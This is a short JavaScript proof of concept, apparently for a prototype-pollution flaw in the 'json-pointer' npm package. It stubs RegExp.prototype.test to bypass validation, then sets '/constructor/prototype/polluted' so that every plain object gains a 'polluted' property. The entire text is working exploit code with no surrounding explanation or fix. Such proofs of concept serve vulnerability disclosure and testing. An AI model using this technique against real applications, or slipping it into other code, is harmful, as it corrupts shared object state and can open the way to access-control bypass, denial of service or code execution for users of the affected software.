RegExp.prototype.test = () => true;
const pointer = require('json-pointer');
let obj = {};
console.log({}.polluted);
pointer.set(obj, '/constructor/prototype/polluted', 'yes');
console.log({}.polluted);